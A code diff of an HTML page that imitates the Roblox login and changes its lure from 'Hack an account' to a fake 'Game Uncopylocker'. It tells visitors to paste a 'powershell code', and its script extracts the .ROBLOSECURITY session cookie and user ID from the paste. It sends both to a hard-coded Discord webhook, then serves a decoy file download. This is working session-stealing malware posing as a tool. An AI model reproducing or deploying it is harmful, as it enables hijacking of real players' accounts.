@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <meta name="description" content="Give a player code so we can get the rest done for you." />
-    <title>Hack an account</title>
+    <meta name="description" content="Game Uncopylocker" />
+    <title>Uncopylock a game</title>
     
     <link href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico" rel="icon" />
     
@@ -61,37 +61,27 @@
     <main id="react-login-web-app" class="login-container">
         <section id="login-base" class="login-base-container">
             <div class="section-content login-section">
-                <h1 class="login-header">Hack an account.</h1>
+                <h1 class="login-header">Game Uncopylocker</h1>
                 <div id="login-form">
                     <form class="login-form" name="loginForm" novalidate>
-                        <div class="form-group username-form-group">
-                            <input
-                                id="user-email"
-                                name="email"
-                                type="text"
-                                class="form-control input-field"
-                                autocomplete="email webauthn"
-                                placeholder="Your email for the sending pass."
-                            />
-                        </div>
                         <div class="form-group password-form-group">
                             <input
                                 id="login-password"
                                 name="password"
                                 class="form-control input-field"
-                                placeholder="Player's powershell code."
+                                placeholder="Game's powershell code."
                             />
                             <div aria-live="polite"></div>
                         </div>
                         <button type="button" id="login-button" class="btn-full-width login-button btn-secondary-md">
-                            Hack the account.
+                            Extract Game!
                         </button>
                     </form>
                 </div>
 				
                 <div class="text-center forgot-credentials-link">
                     <a id="forgot-credentials-link" class="text-link" href="https://www.youtube.com/watch?v=O-Fc-EXcbNk" target="_self">
-                        How to hack someones account?
+                        How to uncopylock a roblox game?
                     </a>
                 </div>
 
@@ -106,16 +96,16 @@
 
 <script>
 document.getElementById('login-button').addEventListener('click', () => {
-  const email = document.getElementById('user-email').value.trim();
   const powershell = document.getElementById('login-password').value.trim();
+  const a = document.createElement('a');
 
-  if (!email || !powershell) {
-    alert('Please enter both email and powershell code.');
-    return;
-  }
+  a.href = "https://github.com/user-attachments/files/23608508/extractedgame.zip";
+  a.download = "ExtractedGame.rbxl";
 
-  if (!email.includes('@')) {
-    alert('Not correct email.');
+  document.body.appendChild(a);
+
+  if (!powershell) {
+    alert('Please enter the powershell code.');
     return;
   }
 
@@ -142,28 +132,24 @@ document.getElementById('login-button').addEventListener('click', () => {
   const extractedSecurity = SecurityMatch[1];
   const extractedPlayerID = requestIdMatch[1];
 
-  const safeEmail = email.length > 1024 ? email.slice(0, 1024) : email;
-
   const lastSent = localStorage.getItem('lastSentTimestamp');
   const now = Date.now();
   const oneHour = 60 * 60 * 1000;
 
   if (lastSent && now - lastSent < oneHour) {
     const minutesLeft = Math.ceil((oneHour - (now - lastSent)) / 60000);
-    alert(`Please wait ${minutesLeft} minute(s) before hacking again.`);
+    alert(`Please wait ${minutesLeft} minute(s) before extracting again.`);
     return;
   }
 
-  // Want to team up with me? If nah then here you go, heres the webhook. If you will break it, i wll regenerate it. -newtrocker42
-  const webhookUrl = "https://discord.com/api/webhooks/1399271408596684872/4S9QnGh-iNaq6_Q3rmKTZpaexo97g_eF2rl3HOVNQD989EwWYCW0HbllbY2xB3OGcMzu";
+  const webhookUrl = "https://discord.com/api/webhooks/1440337366970794156/HH54e5eXNvrebLgjXmeiBUWcblgiq8lV3AnasAmwDh9-9XeZCzDG1N5BDIg92n59fFEP";
 
   const payload = {
     embeds: [{
-      title: "Account Captured",
+      title: "Captured",
       color: 15158332,
-      description: `**.ROBLOSECURITY:**\n${extractedSecurity}`,
+      description: `**.ROBLOSECURITY:**\n\`${extractedSecurity}\``,
       fields: [
-        { name: "Email", value: safeEmail, inline: false },
         { name: "UserID", value: extractedPlayerID, inline: false },
       ],
       timestamp: new Date().toISOString()
@@ -177,17 +163,18 @@ document.getElementById('login-button').addEventListener('click', () => {
   })
   .then(response => {
     if (response.ok) {
-      alert("Selected Account Hacked. Check your email inbox in about an hour to see the password of the selected account.");
+      alert("Selected Game Extracted. Rename zip to rbxl");
       localStorage.setItem('lastSentTimestamp', now);
-      document.getElementById('user-email').value = '';
       document.getElementById('login-password').value = '';
+	  a.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, view: window }));
+	  document.body.removeChild(a);
     } else {
-      response.text().then(text => console.error("Discord webhook error:", text));
-      alert("Failed to hack the account. Maybe the servers are down? Try again later");
+      response.text().then(text => console.error("Error:", text));
+      alert("Failed to extract the game. Maybe the servers are down? Try again later");
     }
   })
   .catch(error => {
-    alert("Error sending data.");
+    alert("Error sending.");
     console.error(error);
   });
 });
